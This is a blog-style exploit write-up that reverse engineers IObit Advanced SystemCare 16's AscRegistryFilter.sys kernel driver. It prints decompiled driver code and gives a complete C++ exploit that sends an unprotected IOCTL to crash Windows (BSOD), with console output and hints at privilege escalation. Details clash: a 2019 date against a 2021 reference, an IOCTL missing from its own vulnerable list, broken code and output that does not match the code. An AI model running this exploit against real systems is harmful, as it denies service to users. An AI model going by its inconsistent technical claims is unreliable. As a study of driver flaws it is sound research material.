---
title: Exploiting IOBIT Advanced SystemCare 16 AscRegistryFilter.sys Windows Kernel Driver (DoS)
author: RashidKhanPathan
date: 2019-08-09 20:55:00 +0800
categories: [Windows]
tags: [exploit writing, windows kernel driver, 0Day,]
pin: true
toc: true
img_path: '/posts/20180809'
---

## Description
Welcome everyone, i have been some doing security research on Windows Kernel Exploitation and while doing it came across `HackSysExtremeVulnerableDriver` an about year ago a Vulnerable Windows Kernel Driver made for `Windows Kernel Driver Exploitation` by `HackSys Team` so immidiately downloaded and setup this driver by following `github.io` step by step tutorial and started to exploiting it, the exploitation is actually complicated but was fun while doing reverse engineering and exploit writing, now for this driver you will find bunch resources online which would teach you How to Reverse Engineer this driver to Exploit Writing, here is the repo for it's resources `github.com`, after understating and learning reverse engineering and exploiting `HEVD` i got enough knowledge for exploting real life windows kernel drivers, so what i have done is, i started to look for some real life windows kernel drivers and found bunch of them in some of the most popular tech-giant's products which almost everyone uses in their daily lives, eg: Anti-Viruses, Gaming Motherboards, GPU's including Nvidia & AMD and other vendors, as well windows it self has bigger attack surface for windows kernel driver exploitation, so without wasting any more time let's start

## Prerequisites

We need to download and install some important softwares for our exploiting this Vulnerability
- **[IOBIT Advanced System Care 16]**
- **Virtual Machine VMare/VirtualBox (Windows 10 Installed)**
- **IDA Disassembler Free/Pro**
- **Visual Studio Any Version (C++) Installed**

## Installation
Once Downloading **[IOBIT Advanced System Care 16]** we can simply run installer and install it like we install any software, after installation the `AscRegistryFilter.sys` get's automattically installed in system 

### Reverse Engineering The Driver

make a copy of `AscRegistryFilter.sys` and paste it on Desktop the open it in IDA so we can Reverse Engineer it

first we have understand what is actully `AscRegistryFilter.sys` driver?
`AscRegistryFilter.sys` is a system driver file that is part of `Advanced SystemCare`, a utility software developed by IObit. Advanced SystemCare is designed to optimize and improve the performance of Windows systems by cleaning up junk files, optimizing system settings, and providing various maintenance tasks.

now let's move on our Reverse Engineering Part, first thing we have to do it is find driver handle to as a Non-Privileged user we can communicate with it, it was easy to find `DriverEntry` in this driver just goto in Import and look for this function `IoCreateDevice` once we found this function then right click on it and select Jump to XREF and select first function, it will sent you `DriverEntry` automatically

i have made code little bit cleaner to understand so anyone can understand what's going on in this code ? we can see ```RtlInitUnicodeString(DestinationString, L"\\Device\\AscRegistryFilter");``` holding our driver handle `AscRegistryFilter`, using this handle we gonna communicate with driver, to communicate with we have to use `Visual Studio with C++ Installed`


```c++
// DriverEntry
NTSTATUS __fastcall DriverEntry(_QWORD *DriverObject)
{
  NTSTATUS result; // rax
  int SymbolicLink; // ebx
  char v4; // [rsp+28h] [rbp-50h]
  char DestinationString[16]; // [rsp+40h] [rbp-38h] BYREF
  char SymbolicLinkName[16]; // [rsp+50h] [rbp-28h] BYREF
  WCHAR Dst[24]; // [rsp+60h] [rbp-18h] BYREF
  __int64 v8; // [rsp+90h] [rbp+18h] BYREF

  v8 = 0i64;
  RtlInitUnicodeString(DestinationString, L"\\Device\\AscRegistryFilter");
  v4 = 0;
  result = IoCreateDevice(DriverObject, 0i64, DestinationString, 34i64, 256, v4, &v8);
  if ( (int)result >= 0 )
  {
    RtlInitUnicodeString(SymbolicLinkName, L"\\DosDevices\\AscRegistryFilter");
    SymbolicLink = IoCreateSymbolicLink(SymbolicLinkName, DestinationString);
    if ( SymbolicLink >= 0 )
    {
      sub_114D4((__int64)DriverObject);
      qword_16528 = 0i64;
      qword_16530 = 0i64;
      qword_16538 = 0i64;
      qword_16558 = (__int64)&qword_16550;
      qword_16550 = (__int64)&qword_16550;
      qword_16548 = (__int64)&qword_16540;
      qword_16568 = (__int64)&qword_16560;
      qword_16560 = (__int64)&qword_16560;
      qword_16540 = (__int64)&qword_16540;
      sub_133C0(qword_16200, 1449225333);
      sub_133C0(qword_162C0, 1264941430);
      sub_133C0(qword_16140, 1215324519);
      sub_133C0(qword_16440, 1264144973);
      sub_133C0(qword_16380, 1449218637);
      DriverObject[16] = sub_115CC;
      DriverObject[14] = sub_115CC;
      DriverObject[32] = sub_115CC;
      DriverObject[13] = sub_11388;
      DriverObject[28] = sub_116C4;
      RtlInitUnicodeString(v7, L"ZwQueryInformationProcess");
      qword_16588 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD))MmGetSystemRoutineAddress(v7);
      IoInitializeTimer(v8, sub_11110, 0i64);
      IoStartTimer(v8);
      return 0i64;
    }
    else
    {
      IoDeleteDevice(v8);
      return (unsigned int)SymbolicLink;
    }
  }
  return result;
}
```

#### Explanation of DriverEntry Function

The `DriverEntry` function serves as the entry point for a Windows kernel driver. Its main purpose is to initialize the driver, create a device, establish symbolic links, set up function pointers, and initialize a timer for the driver's operation. Below is a breakdown of the code's functionality:

1. `NTSTATUS __fastcall DriverEntry(_QWORD *DriverObject)`: This function takes a pointer to the driver object as an argument and returns an NTSTATUS value, indicating the success or failure of the driver initialization.

2. `v8 = 0i64;`: A variable `v8` is initialized with the value 0. This variable will later hold a handle to the device.

3. `RtlInitUnicodeString(DestinationString, L"\\Device\\AscRegistryFilter");`: The function `RtlInitUnicodeString` is used to initialize a Unicode string named `DestinationString` with the value "\\Device\\AscRegistryFilter". This string represents the name of the device to be created.

4. `v4 = 0;`: Another variable `v4` is initialized with the value 0. Its purpose will become clear shortly.

5. `result = IoCreateDevice(DriverObject, 0i64, DestinationString, 34i64, 256, v4, &v8);`: The `IoCreateDevice` function is called to create a new device. The parameters passed are as follows:
   - `DriverObject`: A pointer to the driver object.
   - `0i64`: Reserved parameter (not used in this context).
   - `DestinationString`: The name of the device.
   - `34i64`: Device characteristics.
   - `256`: Device flags.
   - `v4`: An additional parameter (0 in this case).
   - `&v8`: A pointer to the variable `v8` that will hold the device handle.

6. `if ((int)result >= 0)`: If the device creation is successful (indicated by a non-negative `result`):
   - `RtlInitUnicodeString(SymbolicLinkName, L"\\DosDevices\\AscRegistryFilter");`: A Unicode string `SymbolicLinkName` is initialized with the value "\\DosDevices\\AscRegistryFilter". This will be used to create a symbolic link to the device.

7. `if (SymbolicLink >= 0)`: If creating the symbolic link succeeds:
   - `sub_114D4((__int64)DriverObject);`: A function named `sub_114D4` is called, passing the driver object's address as an argument.
   - Several `qword` variables (`qword_16528`, `qword_16530`, etc.) are initialized with zero or specific addresses.
   - Function pointers in the `DriverObject` are set to various driver operations.
   - The system routine name `"ZwQueryInformationProcess"` is used to initialize a function pointer using `MmGetSystemRoutineAddress`.
   - A timer is initialized and started using `IoInitializeTimer` and `IoStartTimer`, respectively.

8. `else`: If creating the symbolic link fails:
   - `IoDeleteDevice(v8);`: The device is deleted using its handle stored in `v8`.
   - The symbolic link creation error code is returned.

9. `return result;`: The function returns the result of the device creation attempt.

the `DriverEntry` function is pivotal for initializing the driver and its associated components. It ensures that the necessary device, symbolic links, and function pointers are set up correctly, enabling the driver to perform its intended tasks. 

> Note: you will be able to find more information about this online i will add some references at the end of this writeup.
{: .prompt-info }


now let's move on writing our exploit code
here is code for communicating the driver using our handle

```c++
// Exploit.c
#include "Windows.h"
#include <Windows.h>
#include <stdio.h>
#include "Header.h"

int exploit() {
  	HANDLE hDevice = CreateFileA("\\\\.\\AscRegistryFilter", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Error To Get Driver Handle\n", GetLastError());
	}
	printf("[+] SuccessFully Obtained Device Driver Handle %p (%x) \n", hDevice);
}

int main()
{
  exploit();
}
```


The main exploit function that attempts to obtain a handle to the device driver named "AscRegistryFilter."

`HANDLE hDevice = CreateFileA("\\\\.\\AscRegistryFilter",GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);` This line uses the CreateFileA function to open a handle to the device driver named "AscRegistryFilter" with read and write access `(GENERIC_READ | GENERIC_WRITE)`. The device name is specified as `\\\\.\\AscRegistryFilter`, and various flags are used to configure the behavior of the file creation.

`if (hDevice == INVALID_HANDLE_VALUE) { ... }` This condition checks if the obtained handle is valid. If the handle is INVALID_HANDLE_VALUE, it means that there was an error in obtaining the handle.

`printf("[+] SuccessFully Obtained Device Driver Handle %p (%x) \n", hDevice)`;
If the handle is valid, this line prints a success message to the console, indicating that the device driver handle was able to successfully obtained.

Let's run our code, Here we can see after running our exploit it successfully obtained handle, great now we proceed further to write our code
```sh
C:\Users\Rashid>exploit.exe
[+] SuccessFully Obtained Device Driver Handle 0xE5
```
We Successfully able to get our driver handle with our code, now we gonna find IOCTL's that causing BSOD, for that we have to do some more research so let's dive back in IDA and look for function that has IOCTL Values, here we have found `sub_116C4` function which looks promising, if we see analyze the code we are able to see some values which is non Hexadecimal, so if we Decode them using Hexadecimal by Right Cliking On Value > Hexadecimal, IDA convert those values into `0x8001E020` like this format and this is called IOCTL, there are bunch in this `sub_116C4` function and each IOCTL doing something, but we have only find IOCTL that can cause BSOD, but only BSOD is not only Vulnerability here we can do more dangerous than BSOD, Dangerous like getting Privilege Escalation on System with full control using Arbitrary Write/Read Primitives.

```c++
// Functions That Has IOCTL's Decoded
NTSTATUS __fastcall sub_116C4(__int64 a1, __int64 irp_value)
{
  _DWORD *source; // rsi
  _DWORD *v4; // rax
  int v5; // ebx
  __int64 memmove_count; // rbp
  unsigned int v7; // ecx
  unsigned int v8; // edx
  unsigned int NumberOfBytes; // r8d
  int v10; // r14d
  int *memmove_destination; // rdi
  unsigned __int64 v12; // r13
  int *v13; // rax
  _QWORD *v14; // rcx
  unsigned __int64 v15; // r13
  int *v16; // rax
  unsigned __int64 v17; // r13
  int *v18; // rax
  int v19; // eax
  __int64 v20; // r9
  __int64 v21; // r9
  unsigned __int64 count; // r13
  int *destination; // rax
  unsigned __int64 v24; // r13
  int *PoolWithTag; // rax
  __int64 v26; // r9
  __int64 handle; // [rsp+68h] [rbp+10h] BYREF

  source = *(_DWORD **)(irp_value + 24);
  handle = 0i64;
  v4 = *(_DWORD **)(irp_value + 184);
  v5 = 0;
  memmove_count = (unsigned int)v4[4];
  v7 = v4[6];
  v8 = v4[2];
  NumberOfBytes = memmove_count + 2;
  v10 = 0;
  memmove_destination = 0i64;
  if ( v7 > 0x8001E01C )
  {
    if ( v7 == 0x8001E020 )
    {
      if ( v8 >= 0x800 )
      {
        if ( !HIBYTE(word_16500) )
          goto LABEL_76;
        v10 = sub_115F4((__int64)source, v8, &qword_16550, (__int64)&qword_16530, &dword_16574);
        goto LABEL_74;
      }
      goto LABEL_32;
    }
    if ( v7 == 0x8001E024 )
    {
      byte_16502 = *source == 1;
      goto LABEL_76;
    }
    if ( v7 != 0x8001E040 )
    {
      if ( v7 != 0x8001E044 )
      {
        if ( v7 == 0x8001E048 )
        {
          if ( !source )
            goto LABEL_76;
          if ( !(_DWORD)memmove_count )
            goto LABEL_76;
          v24 = NumberOfBytes;
          PoolWithTag = (int *)ExAllocatePoolWithTag(0i64, NumberOfBytes, 1970041958i64);// pool_type
          memmove_destination = PoolWithTag;
          if ( !PoolWithTag )
            goto LABEL_76;
          memset(PoolWithTag, 0i64, v24);
          memmove(memmove_destination, source, memmove_count);
          if ( byte_16502 )
            goto LABEL_74;
          if ( !_InterlockedCompareExchange(&dword_1650C, 0, 0) )
          {
            sub_134C8(qword_16440, 0);
            v14 = qword_16440;
            goto LABEL_17;
          }
        }
        else
        {
          if ( v7 != 0x8001E04C )
            goto LABEL_76;
          if ( !source )
            goto LABEL_76;
          if ( !(_DWORD)memmove_count )
            goto LABEL_76;
          count = NumberOfBytes;
          destination = (int *)ExAllocatePoolWithTag(0i64, NumberOfBytes, 1970041958i64);
          memmove_destination = destination;
          if ( !destination )
            goto LABEL_76;
          memset(destination, 0i64, count);
          memmove(memmove_destination, source, memmove_count);
          if ( byte_16502 )
            goto LABEL_74;
          if ( !_InterlockedCompareExchange(&dword_1650C, 0, 0) )
          {
            sub_134C8(qword_16380, 0);
            v14 = qword_16380;
            goto LABEL_17;
          }
        }
        goto LABEL_24;
      }
      if ( v8 < 0x800 )
      {
LABEL_32:
        v5 = -1073741789;
        goto LABEL_76;
      }
      if ( !byte_16502 )
        goto LABEL_76;
      v19 = sub_115F4((__int64)source, v8, &qword_16560, (__int64)&qword_16538, &dword_16578);
LABEL_35:
      v10 = v19;
      goto LABEL_76;
    }
    if ( *(_BYTE *)(irp_value + 64) == 1 )
    {
      sub_11E98((_QWORD **)&qword_16560, (__int64)&qword_16538, &dword_16578);
      memmove(&handle, source, 4i64);
      LOBYTE(v26) = *(_BYTE *)(irp_value + 64);
      v5 = ObReferenceObjectByHandle(handle, 2i64, ExEventObjectType, v26, &qword_16520, 0i64);
      if ( v5 >= 0 )
      {
        if ( qword_16520 )
          byte_16502 = 1;
      }
    }
  }
  else if ( v7 == 0x8001E01C )
  {
    if ( *(_BYTE *)(irp_value + 64) == 1 )
    {
      sub_11E98((_QWORD **)&qword_16550, (__int64)&qword_16530, &dword_16574);
      memmove(&handle, source, 4i64);
      LOBYTE(v21) = *(_BYTE *)(irp_value + 64);
      v5 = ObReferenceObjectByHandle(handle, 2i64, ExEventObjectType, v21, &qword_16518, 0i64);
      if ( v5 >= 0 )
      {
        if ( qword_16518 )
          HIBYTE(word_16500) = 1;
      }
    }
  }
  else
  {
    if ( v7 == 0x8001E000 )
    {
      LOBYTE(word_16500) = *source == 1;
      goto LABEL_76;
    }
    if ( v7 != 0x8001E004 )
    {
      if ( v7 != 0x8001E008 )
      {
        if ( v7 == 0x8001E00C )
        {
          if ( !source )
            goto LABEL_76;
          if ( !(_DWORD)memmove_count )
            goto LABEL_76;
          v17 = NumberOfBytes;
          v18 = (int *)ExAllocatePoolWithTag(0i64, NumberOfBytes, 1970041958i64);
          memmove_destination = v18;
          if ( !v18 )
            goto LABEL_76;
          memset(v18, 0i64, v17);
          memmove(memmove_destination, source, memmove_count);
          if ( (_BYTE)word_16500 )
            goto LABEL_74;
          if ( !_InterlockedCompareExchange(&dword_16504, 0, 0) )
          {
            sub_134C8(qword_162C0, 0);
            v14 = qword_162C0;
            goto LABEL_17;
          }
        }
        else if ( v7 == 0x8001E010 )
        {
          if ( !source )
            goto LABEL_76;
          if ( !(_DWORD)memmove_count )
            goto LABEL_76;
          v15 = NumberOfBytes;
          v16 = (int *)ExAllocatePoolWithTag(0i64, NumberOfBytes, 1970041958i64);
          memmove_destination = v16;
          if ( !v16 )
            goto LABEL_76;
          memset(v16, 0i64, v15);
          memmove(memmove_destination, source, memmove_count);
          if ( (_BYTE)word_16500 )
            goto LABEL_74;
          if ( !_InterlockedCompareExchange(&dword_16504, 0, 0) )
          {
            sub_134C8(qword_16200, 0);
            v14 = qword_16200;
            goto LABEL_17;
          }
        }
        else
        {
          if ( v7 != 0x8001E014 )
          {
            if ( v7 == -2147360744 )
              HIBYTE(word_16500) = *source == 1;
            goto LABEL_76;
          }
          if ( !source )
            goto LABEL_76;
          if ( !(_DWORD)memmove_count )
            goto LABEL_76;
          v12 = NumberOfBytes;
          v13 = (int *)ExAllocatePoolWithTag(0i64, NumberOfBytes, 1970041958i64);
          memmove_destination = v13;
          if ( !v13 )
            goto LABEL_76;
          memset(v13, 0i64, v12);
          memmove(memmove_destination, source, memmove_count);
          if ( HIBYTE(word_16500) )
            goto LABEL_74;
          if ( !_InterlockedCompareExchange(&dword_16508, 0, 0) )
          {
            sub_134C8(qword_16140, 0);
            v14 = qword_16140;
LABEL_17:
            sub_135C4((__int64)v14, memmove_destination);
            goto LABEL_74;
          }
        }
LABEL_24:
        v5 = -1073741823;
LABEL_74:
        if ( memmove_destination )
          ExFreePoolWithTag(memmove_destination, 1970041958i64);
        goto LABEL_76;
      }
      if ( v8 < 0x800 )
        goto LABEL_32;
      if ( !(_BYTE)word_16500 )
        goto LABEL_76;
      v19 = sub_115F4((__int64)source, v8, &qword_16540, (__int64)&qword_16528, &dword_16570);
      goto LABEL_35;
    }
    if ( *(_BYTE *)(irp_value + 64) == 1 )
    {
      sub_11E98((_QWORD **)&qword_16540, (__int64)&qword_16528, &dword_16570);
      memmove(&handle, source, 4i64);
      LOBYTE(v20) = *(_BYTE *)(irp_value + 64);
      v5 = ObReferenceObjectByHandle(handle, 2i64, ExEventObjectType, v20, &object, 0i64);
      if ( v5 >= 0 )
      {
        if ( object )
          LOBYTE(word_16500) = 1;
      }
    }
  }
LABEL_76:
  *(_QWORD *)(irp_value + 56) = v10;
  *(_DWORD *)(irp_value + 48) = v5;
  IofCompleteRequest(irp_value, 0i64);
  return (unsigned int)v5;
}

```


These Are Extracted IOCTL's from Our Reverse Engineered Driver

```cpp
Follwing IOCTL's Are Vulnerable
Address | IOCTL Code | Device | Function | Method | Access
0x11724 | 0x8001E000 | <UNKNOWN> 0x8001 | 0x800 | METHOD_BUFFERED 0 | FILE_READ_ACCESS | FILE_WRITE_ACCESS (3)
0x11730 | 0x8001E004 | <UNKNOWN> 0x8001 | 0x801 | METHOD_BUFFERED 0 | FILE_READ_ACCESS | FILE_WRITE_ACCESS (3)
0x11768 | 0x8001E018 | <UNKNOWN> 0x8001 | 0x800 | METHOD_BUFFERED 0 | FILE_READ_ACCESS | FILE_WRITE_ACCESS (3)
0x11A91 | 0x8001E024 | <UNKNOWN> 0x8001 | 0x809 | METHOD_BUFFERED 0 | FILE_READ_ACCESS | FILE_WRITE_ACCESS (3)
0x11A9D | 0x8001E040 | <UNKNOWN> 0x8001 | 0x810 | METHOD_BUFFERED 0 | FILE_READ_ACCESS | FILE_WRITE_ACCESS (3)
```

Adding more code our exploit so we can send IOCTL's to Kernel at Ring 0, for that we can use C++ Function called `CreateDeviceA`

```c++
	DWORD byteRetn;

	DWORD IOCTL = 0x8001E01C;

	DWORD Expl[0x1000];

	printf("[+] Calling DeviceIoControl to Load TOCTL Code\n");
	Sleep(500);


	if (DeviceIoControl(hDevice, IOCTL, (LPVOID)0, 0x3, NULL, 0, &byteRetn, NULL)) {
		fprintf(stdout, "[+] SuccessFully Called IOCTL Using DeviceIoControl %p \n", IOCTL);
	}
	else {
		fprintf(stderr, "[-] Error Calling IOCTL Using DeviceIoControl\n");
	}


	CloseHandle(hDevice);


	return 0;

```
if you are not understand the code then dont't worry here is the TL;DR explaination about our added code after we successfully driver interaction code

We interacts with a device driver using the `DeviceIoControl` function. Let's break down the code step by step:

```c++
DWORD byteRetn;
DWORD IOCTL = 0x8001E01C;
DWORD Expl[0x1000];
```
- `DWORD byteRetn;`: This declares a variable byteRetn of type DWORD, which is a 32-bit unsigned integer. It seems like this variable will be used to store a return value, possibly the number of bytes returned by the DeviceIoControl function.

- `DWORD IOCTL = 0x8001E01C;`: This defines an IOCTL (Input/Output Control) code with the value 0x8001E01C. IOCTL codes are used to communicate with device drivers and perform various operations on devices.

- `DWORD Expl[0x1000];`: This declares an array named Expl of type DWORD with a size of 0x1000 (4096) elements. The purpose of this array is not immediately clear from the provided snippet.

```c++
printf("[+] Calling DeviceIoControl to Load IOCTL Code\n");
```
- This line prints a message to the console indicating that the DeviceIoControl function is being called to load a IOCTL.


This section is where the DeviceIoControl function is called to interact with a device driver. The parameters provided are:

```c++
if (DeviceIoControl(hDevice, IOCTL, (LPVOID)0, 0x3, NULL, 0, &byteRetn, NULL)) {
    fprintf(stdout, "[+] SuccessFully Called IOCTL Using DeviceIoControl %p \n", IOCTL);
}
else {
    fprintf(stderr, "[-] Error Calling IOCTL Using DeviceIoControl\n");
}
CloseHandle(hDevice);

return 0;
```

- hDevice: A handle to the device. It appears to be defined somewhere else in the code.
- IOCTL: The IOCTL code defined earlier.
- (LPVOID)0: This seems to be a pointer to input data (buffer), but in this case, it's set to NULL.
- 0x3: The size of the input buffer, which is 3 bytes.
NULL: The output buffer, set to NULL here.
- 0: The size of the output buffer.
- &byteRetn: A pointer to the byteRetn variable, where the number of bytes returned by the function will be stored.
- NULL: This parameter is used for overlapped operations, and it's set to NULL here.
- if DeviceIoControl call succeeds or fails, a message is printed to the console
- `CloseHandle(hDevice);` This line closes the handle to the device, releasing any resources associated with it.
- `return 0;` This line returns an exit code of 0, indicating successful execution.

if you want's learn more about these functions then i would recommened you checking [Windows API Documentation](https://learn.microsoft.com/en-us/windows/win32/api)


now let's compile and run our exploit

#### Complete Exploit
```c++
// Exploit.c
#include "Windows.h"
#include <Windows.h>
#include <stdio.h>
#include "Header.h"


int main(void)
{
	printf("[+] Exploit Title: IOBIT Advanced System Care 16.0 DOS Exploit\n");
	printf("[+] Vulnerability Title: CWE-782 - Exposed IOCTL with Insufficient Access Control\n");
	printf("[+] Exploit Author: RashidKhan Pathan (iHexCoder)\n");
	printf("[+] Version: 16.1.0.106\n");
	printf("[+] Tested On: Windows 10 Pro x86/x64 Bit 1607 (OS Build 14393.2189), 20H2\n");
	
  printf("[+] Calling CreateFileA to Obtain Driver Handle\n");
	HANDLE hDevice = CreateFileA("\\\\.\\AscRegistryFilter", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Error To Get Driver Handle\n");
	}
	printf("[+] SuccessFully Obtained Device Driver Handle %p (%x) \n", hDevice);


	DWORD byteRetn;

	DWORD IOCTL = 0x8001E01C;

	DWORD Expl[0x1000];

	// EIP 0x81f94d14

	printf("[+] Calling DeviceIoControl to Load TOCTL Code\n");
	Sleep(500);


	DWORD shellCode[256] = {};


	if (DeviceIoControl(hDevice, IOCTL, (LPVOID)0, 0x3, NULL, 0, &byteRetn, NULL)) {
		fprintf(stdout, "[+] SuccessFully Called IOCTL Using DeviceIoControl %p \n", IOCTL);
    printf("[+] Causing BSOD\n")
	}
	else {
		fprintf(stderr, "[-] Error Calling IOCTL Using DeviceIoControl\n");
	}


	CloseHandle(hDevice);


	return 0;

};
```
###### Results: 

```cmd
C:\Users\Rashid>exploit.exe
[+] Exploit Title: IOBIT Advanced System Care 16.0 DOS Exploit
[+] Vulnerability Title: CWE-782 - Exposed IOCTL with Insufficient Access Control
[+] Exploit Author: RashidKhan Pathan (iHexCoder)
[+] Version: 16.1.0.106
[+] Tested On: Windows 10 Pro x86/x64 Bit 1607 (OS Build 14393.2189), 20H2 Also
[+] Version: 16.1.0.106
[+] Calling DeviceIoControl to Load TOCTL Code
[+] SuccessFully Obtained Device Driver Handle %p
[+] Causing BSOD
```
### Video PoC

-------------------------

### Summary
##### What we have learned so far?
we have learned about the process of reverse engineering and exploiting a vulnerable Windows kernel driver. The article provides a step-by-step guide on how to exploit the driver to trigger a denial-of-service (DoS) attack

**Prerequisites**: we sets up the environment IOBIT Advanced System Care 16, a virtual machine (VMWare/VirtualBox) with Windows 10 installed, IDA Disassembler, and Visual Studio.

**Installation**: IOBIT Advanced System Care 16 is installed, and the AscRegistryFilter.sys Windows kernel driver is automatically installed as part of the software.

**Reverse Engineering The Driver**: then we opens the AscRegistryFilter.sys driver in IDA Free/Pro to reverse engineer it. The driver is a system driver file that is part of Advanced SystemCare, a utility software developed by IObit.

**DriverEntry Function**: The DriverEntry function is analyzed and explained. This function is a crucial entry point for a Windows kernel driver. It initializes the driver, creates a device, establishes symbolic links, sets up function pointers, and initializes a timer for the driver's operation.

**Explanation of IOCTLs**: The article explains IOCTLs (Input/Output Control codes) and their significance in interacting with device drivers. Several IOCTLs are extracted from the reverse-engineered driver's code.

**Exploit Code**: we wrote exploit code in C++ that interacts with the vulnerable driver. The code demonstrates how to obtain a handle to the driver, send IOCTLs to it, and trigger the vulnerability to cause a BSOD (Blue Screen of Death).

**Explanation of Exploit Code**: The exploit code is explained step by step. It shows how the code interacts with the driver using the DeviceIoControl function, sends IOCTLs, and triggers the DoS vulnerability.

### References

[VoidSec](https://voidsec.com)

[Connor McGarr](https://connormcgarr.github.io)

[Windows Kernel Debugging](https://fluidattacks.com/blog/windows-kernel-debugging/)

[BlackHat](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf)

[exploiting-the-windows-kernel-ntfs-with-wnf-part-1](https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/)

[HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)

##### Peace

